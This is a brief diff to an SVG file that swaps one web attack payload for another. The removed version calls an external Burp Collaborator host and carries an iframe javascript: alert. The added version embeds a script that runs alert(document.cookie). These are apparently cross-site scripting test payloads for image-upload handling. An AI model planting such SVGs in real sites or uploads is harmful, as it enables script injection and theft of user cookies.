@@ -1,4 +1,6 @@
-<svg width="200" height="200"
-  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="https://89ftrr7eh0iayw2kzepliajoifo9cy.burpcollaborator.net/image.jpg" height="200" width="200"/>
-<iframe src=javascript:alert(5)></svg>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert(document.cookie);
+   </script>
+</svg>
